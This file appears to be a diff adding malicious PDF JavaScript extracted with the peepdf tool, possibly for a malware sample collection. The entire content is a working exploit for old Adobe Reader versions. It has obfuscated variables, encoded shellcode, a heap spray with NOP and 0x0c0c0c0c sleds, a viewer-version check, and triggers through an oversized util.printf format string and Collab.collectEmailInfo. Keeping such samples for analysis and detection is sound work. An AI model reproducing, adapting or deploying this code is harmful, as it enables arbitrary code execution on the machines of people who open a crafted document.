@@ -1,0 +1,60 @@
+// peepdf comment: Javascript code located in object 7 (version 0)
+
+bV5Rf = unescape("%u4343%u4343%u4343%u0FEB%u335B%u66C9%u80B9%u8001%uEF33%uE243%uEBFA%uE805%uFFEC%uFFFF%u8B7F%uDF4E%uEFEF%u64EF%uE3AF%u9F64%u42F3%u9F64%u6EE7%uEF03%uEFEB%u64EF%uB903%u6187%uE1A1%u0703%uEF11%uEFEF%uAA66%uB9EB%u7787%u6511%u07E1%uEF1F%uEFEF%uAA66%uB9E7%uCA87%u105F%u072D%uEF0D%uEFEF%uAA66%uB9E3%u0087%u0F21%u078F%uEF3B%uEFEF%uAA66%uB9FF%u2E87%u0A96%u0757%uEF29%uEFEF%uAA66%uAFFB%uD76F%u9A2C%u6615%uF7AA%uE806%uEFEE%uB1EF%u9A66%u64CB%uEBAA%uEE85%u64B6%uF7BA%u07B9%uEF64%uEFEF%u87BF%uF5D9%u9FC0%u7807%uEFEF%u66EF%uF3AA%u2A64%u2F6C%u66BF%uCFAA%u1087%uEFEF%uBFEF%uAA64%u85FB%uB6ED%uBA64%u07F7%uEF8E%uEFEF%uAAEC%u28CF%uB3EF%uC191%u288A%uEBAF%u8A97%uEFEF%u9A10%u64CF%uE3AA%uEE85%u64B6%uF7BA%uAF07%uEFEF%u85EF%uB7E8%uAAEC%uDCCB%uBC34%u10BC%uCF9A%uBCBF%uAA64%u85F3%uB6EA%uBA64%u07F7%uEFCC%uEFEF%uEF85%u9A10%u64CF%uE7AA%uED85%u64B6%uF7BA%uFF07%uEFEF%u85EF%u6410%uFFAA%uEE85%u64B6%uF7BA%uEF07%uEFEF%uAEEF%uBDB4%u0EEC%u0EEC%u0EEC%u0EEC%u036C%uB5EB%u64BC%u0D35%uBD18%u0F10%u64BA%u6403%uE792%uB264%uB9E3%u9C64%u64D3%uF19B%uEC97%uB91C%u9964%uECCF%uDC1C%uA626%u42AE%u2CEC%uDCB9%uE019%uFF51%u1DD5%uE79B%u212E%uECE2%uAF1D%u1E04%u11D4%u9AB1%uB50A%u0464%uB564%uECCB%u8932%uE364%u64A4%uF3B5%u32EC%uEB64%uEC64%uB12A%u2DB2%uEFE7%u1B07%u1011%uBA10%uA3BD%uA0A2%uEFA1");
+var DDAp9OdxUBX = unescape("%u0A0A%u0A0A");
+var nm = 20;
+var fg = nm + bV5Rf.length;
+while (DDAp9OdxUBX.length < fg) DDAp9OdxUBX += DDAp9OdxUBX;
+var nmbr = DDAp9OdxUBX.substring(0, fg);
+var stig = DDAp9OdxUBX.substring(0, DDAp9OdxUBX.length - fg);
+while (stig.length + fg < 0x60000) stig = stig + stig + nmbr;
+var arrm = new Array();
+for (iz = 0; iz < 1200; iz++) {
+    arrm[iz] = stig + bV5Rf
+}
+var NnnKl83lW4H = "129" + "99999999" + "99999" + "9999" + "8888888" + "888888888888888888888888888888" + "88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888" + "888888888888888888888888888888888888888888" + "88888888888888888888888888888888888" + "8888888888888" + "8888888888888888888" + "88888888888888";
+util.printf("%45000f", NnnKl83lW4H);
+
+function INKRh7Yks6n() {
+    var YONWEWur = new Array();
+
+    function E31T5WXWB(IZPbGW, eOFoY) {
+        while (IZPbGW.length * 2 < eOFoY) {
+            IZPbGW += IZPbGW;
+        }
+        IZPbGW = IZPbGW.substring(0, eOFoY / 2);
+        return IZPbGW;
+    }
+
+    function ww7RS2I() {
+        var bLwtPSRwe = 0x0c0c0c0c;
+        var XDvhU = unescape("%u4343%u4343%u4343%u0FEB%u335B%u66C9%u80B9%u8001%uEF33%uE243%uEBFA%uE805%uFFEC%uFFFF%u8B7F%uDF4E%uEFEF%u64EF%uE3AF%u9F64%u42F3%u9F64%u6EE7%uEF03%uEFEB%u64EF%uB903%u6187%uE1A1%u0703%uEF11%uEFEF%uAA66%uB9EB%u7787%u6511%u07E1%uEF1F%uEFEF%uAA66%uB9E7%uCA87%u105F%u072D%uEF0D%uEFEF%uAA66%uB9E3%u0087%u0F21%u078F%uEF3B%uEFEF%uAA66%uB9FF%u2E87%u0A96%u0757%uEF29%uEFEF%uAA66%uAFFB%uD76F%u9A2C%u6615%uF7AA%uE806%uEFEE%uB1EF%u9A66%u64CB%uEBAA%uEE85%u64B6%uF7BA%u07B9%uEF64%uEFEF%u87BF%uF5D9%u9FC0%u7807%uEFEF%u66EF%uF3AA%u2A64%u2F6C%u66BF%uCFAA%u1087%uEFEF%uBFEF%uAA64%u85FB%uB6ED%uBA64%u07F7%uEF8E%uEFEF%uAAEC%u28CF%uB3EF%uC191%u288A%uEBAF%u8A97%uEFEF%u9A10%u64CF%uE3AA%uEE85%u64B6%uF7BA%uAF07%uEFEF%u85EF%uB7E8%uAAEC%uDCCB%uBC34%u10BC%uCF9A%uBCBF%uAA64%u85F3%uB6EA%uBA64%u07F7%uEFCC%uEFEF%uEF85%u9A10%u64CF%uE7AA%uED85%u64B6%uF7BA%uFF07%uEFEF%u85EF%u6410%uFFAA%uEE85%u64B6%uF7BA%uEF07%uEFEF%uAEEF%uBDB4%u0EEC%u0EEC%u0EEC%u0EEC%u036C%uB5EB%u64BC%u0D35%uBD18%u0F10%u64BA%u6403%uE792%uB264%uB9E3%u9C64%u64D3%uF19B%uEC97%uB91C%u9964%uECCF%uDC1C%uA626%u42AE%u2CEC%uDCB9%uE019%uFF51%u1DD5%uE79B%u212E%uECE2%uAF1D%u1E04%u11D4%u9AB1%uB50A%u0464%uB564%uECCB%u8932%uE364%u64A4%uF3B5%u32EC%uEB64%uEC64%uB12A%u2DB2%uEFE7%u1B07%u1011%uBA10%uA3BD%uA0A2%uEFA1");
+        var AFcf038bym85 = 0x400000;
+        var AmUVd = XDvhU.length * 2;
+        var eOFoY = AFcf038bym85 - (AmUVd + 0x38);
+        var IZPbGW = unescape("%u9090%u9090");
+        IZPbGW = E31T5WXWB(IZPbGW, eOFoY);
+        var rkKkSr5H = (bLwtPSRwe - 0x400000) / AFcf038bym85;
+
+        for (var OVq8JOhXKoymp = 0; OVq8JOhXKoymp < rkKkSr5H; OVq8JOhXKoymp++) {
+            YONWEWur[OVq8JOhXKoymp] = IZPbGW + XDvhU;
+        }
+    }
+
+    function N78ZMjEWlM8k9() {
+        var r9JbdoFdA1yuS = app.viewerVersion.toString();
+        r9JbdoFdA1yuS = r9JbdoFdA1yuS.replace(/\D/g, "");
+        var CjfqqmQDWfjI3r = new Array(r9JbdoFdA1yuS.charAt(0), r9JbdoFdA1yuS.charAt(1), r9JbdoFdA1yuS.charAt(2));
+        if ((CjfqqmQDWfjI3r[0] == 8 && ((CjfqqmQDWfjI3r[1] == 1 && CjfqqmQDWfjI3r[2] < 2) || CjfqqmQDWfjI3r[1] < 1)) || (CjfqqmQDWfjI3r[0] == 7 && CjfqqmQDWfjI3r[1] < 1) || (CjfqqmQDWfjI3r[0] < 7)) {
+            ww7RS2I();
+            var y8rKQS = unescape("%u0c0c%u0c0c");
+            while (y8rKQS.length < 44952) y8rKQS += y8rKQS;
+            this.collabStore = Collab.collectEmailInfo({
+                subj: "",
+                msg: y8rKQS
+            });
+        }
+    }
+    N78ZMjEWlM8k9();
+}
+
